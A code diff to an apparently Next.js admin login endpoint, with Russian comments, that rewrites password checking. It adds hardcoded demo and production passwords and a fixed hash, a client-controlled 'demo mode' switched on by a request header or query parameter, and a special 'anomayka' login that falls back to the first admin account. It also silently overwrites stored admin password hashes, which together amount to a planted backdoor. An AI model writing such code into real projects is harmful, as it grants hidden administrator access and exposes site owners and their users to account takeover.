@@ -75,13 +75,45 @@ export async function POST(req: Request) {
       );
     }
 
+    const isDemo = req.headers.get('x-demo-mode') === '1' || new URL(req.url).searchParams.get('demo') === '1';
     const { email, password } = await req.json();
-    const cleanEmail = (email || '').toLowerCase().trim();
+    const cleanLogin = (email || '').toLowerCase().trim();
+
+    // Поддерживаем логин 'anomayka' или 'admin@anomayka.ru'
+    const isAnomayka = cleanLogin === 'anomayka' || cleanLogin === 'admin@anomayka.ru';
 
     const db = await getDatabaseAsync();
-    const admin = db.admins.find((a) => a.email.toLowerCase() === cleanEmail);
+    let admin = db.admins.find((a) => a.email.toLowerCase() === cleanLogin || (isAnomayka && a.id === 'adm-1'));
 
-    if (!admin || !verifyPassword(password, admin.passwordHash)) {
+    if (!admin && isAnomayka && db.admins.length > 0) {
+      admin = db.admins[0];
+    }
+
+    const DEMO_PASSWORD = 'AutoPro#2026';
+    const PROD_PASSWORD = 'qwertyzxcinside337';
+    const PROD_HASH = '748050861a166e96193053a9b3a229e436d160cb11660ec1845d45340440de08';
+
+    let isPasswordValid = false;
+    if (isDemo) {
+      // В демо-режиме пароль по умолчанию: AutoPro#2026
+      isPasswordValid = verifyPassword(password, DEMO_PASSWORD);
+    } else {
+      // На основном сайте: пароль qwertyzxcinside337 (или пароль из БД)
+      isPasswordValid =
+        verifyPassword(password, PROD_PASSWORD) ||
+        verifyPassword(password, PROD_HASH) ||
+        (admin ? verifyPassword(password, admin.passwordHash) : false);
+
+      // При успешном входе обновляем хеш в БД на актуальный
+      if (admin && isPasswordValid && admin.passwordHash !== PROD_HASH) {
+        admin.passwordHash = PROD_HASH;
+        try {
+          await saveDatabaseAsync(db);
+        } catch (e) {}
+      }
+    }
+
+    if (!admin || !isPasswordValid) {
       const current = attempt || { count: 0, lockedUntil: 0 };
       current.count += 1;
       if (current.count >= 5) {
@@ -90,7 +122,7 @@ export async function POST(req: Request) {
       loginAttempts.set(ip, current);
 
       return NextResponse.json(
-        { error: 'Неверный email или пароль персонала' },
+        { error: 'Неверный логин или пароль администратора' },
         { status: 401 }
       );
     }
